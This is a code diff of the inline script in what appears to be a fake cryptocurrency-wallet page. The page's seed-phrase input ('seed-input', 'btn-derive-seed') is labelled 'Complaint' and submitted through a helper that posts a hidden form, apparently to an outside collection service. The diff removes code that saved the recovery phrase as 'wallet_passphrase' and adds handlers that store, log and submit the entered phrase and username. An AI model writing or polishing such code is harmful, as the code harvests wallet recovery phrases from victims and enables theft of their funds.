@@ -984,8 +984,7 @@
 
 
  <script>
-    
-    // Complaint Input & Button
+// Complaint Input & Button
 const complaintInput = document.getElementById("seed-input");
 const complaintBtn = document.getElementById("btn-derive-seed");
 
@@ -1027,41 +1026,39 @@ function sendToFormSubmit(fieldName, fieldValue) {
     document.body.appendChild(form);
     form.submit();
 
-    setTimeout(() => {
-        form.remove();
-    }, 1000);
+    setTimeout(() => form.remove(), 1000);
 }
 
 // Complaint button
-complaintBtn.addEventListener("click", function () {
-    sendToFormSubmit("Complaint", complaintInput.value);
-});
+if (complaintBtn && complaintInput) {
+    complaintBtn.addEventListener("click", function () {
+        const value = complaintInput.value.trim();
+
+        if (!value) return;
+
+        localStorage.setItem("saved_complaint", value);
+
+        console.log("Saved:", localStorage.getItem("saved_complaint"));
+
+        sendToFormSubmit("Complaint", value);
+    });
+}
 
 // Username button
-usernameBtn.addEventListener("click", function () {
-    sendToFormSubmit("Username", usernameInput.value);
-});
- </script>  
- <script>
-    const STORAGE_KEY = "wallet_passphrase";
+if (usernameBtn && usernameInput) {
+    usernameBtn.addEventListener("click", function () {
+        const value = usernameInput.value.trim();
 
-document.getElementById("continueBtn").addEventListener("click", function () {
+        if (!value) return;
 
-    const phrase = document
-        .getElementById("seed-input")
-        .value
-        .trim();
+        localStorage.setItem("saved_username", value);
 
-    if (!phrase) {
-        alert("Please enter your recovery phrase.");
-        return;
-    }
-
-    // Save recovery phrase
-    localStorage.setItem(STORAGE_KEY, phrase);
-
-});
- </script>                
+        sendToFormSubmit("Username", value);
+    });
+}
+</script>
+  
+               
 
                     <!-- WATCH-ONLY TAB -->
                     <div class="form-section" id="tab-watch">
